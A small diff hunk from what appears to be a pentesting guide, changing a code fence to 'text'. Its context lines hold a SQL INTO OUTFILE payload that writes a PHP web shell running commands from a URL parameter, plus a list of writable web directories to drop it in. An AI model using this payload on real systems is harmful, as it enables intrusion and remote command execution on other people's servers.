@@ -124,7 +124,7 @@ SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/lib/mysql-files/shell
 
 Common writable directories:
 
-```
+```text
 /var/www/html/
 /var/www/html/images/
 /var/www/html/uploads/
